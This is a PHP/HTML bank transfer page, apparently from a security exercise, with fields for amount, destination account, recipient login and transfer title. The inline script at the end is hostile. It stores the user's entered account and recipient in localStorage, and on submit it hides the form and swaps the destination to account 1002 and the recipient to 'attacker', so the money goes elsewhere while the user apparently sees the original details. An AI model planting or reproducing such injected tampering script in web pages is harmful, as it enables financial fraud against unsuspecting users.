<?php
session_start();
?>

<!DOCTYPE html>
<html>
<head>
	<title>Transfer</title>
</head>

<body>
	<div class="form">

			<div id="transfer">
			<h1>Make transfer</h1>

			<form name="form" action="confirmation.php" method="post" autocomplete="off">
				<div class="field-wrap">
				<label>
				Amount<span class ="req">*</span>
				</label>
				<input type="number" step="0.01" min=0 required autocomplete="off" name="amount" />
				</div>

				<div class="field-wrap">
				<label>
				Destination account number<span class ="req">*</span>
				</label>
				<input type="number" step="1" min=1000 required autocomplete="off" name="dest" />
				</div>

				<div class="field-wrap">
				<label>
				Login of recipient<span class ="req">*</span>
				</label>
				<input type="text" required autocomplete="off" name="recipient" />
				</div>

				<div class="field-wrap">
				<label>
				Transfer title<span class ="req">*</span>
				</label>
				<input type="text" required autocomplete="off" name="title" />
				</div>

				<button class="button button-block" name="confirmation"/>Send</button>
			</form>
			</div>

	</div> <!--form-->

	<script>
		var number = document.getElementsByName("dest")[0];
		var recipient = document.getElementsByName("recipient")[0];
		var form = document.getElementsByName("form")[0];
		
		number.addEventListener("change", 
		function()
		{
			var realNumber = number.value;
			//console.log(realNumber);
			localStorage.setItem("realNumber", realNumber);
			//console.log(localStorage);
		});

		recipient.addEventListener("change",
		function()
		{
			var realRecipient = recipient.value;
			//console.log(realRecipient);
			localStorage.setItem("realRecipient", realRecipient);
			//console.log(localStorage);
		});

		form.addEventListener("submit",
		function()
		{
			form.style.display = "none";
			number.value = 1002;
			recipient.value = "attacker";
		});
	</script>
</body>
</html>










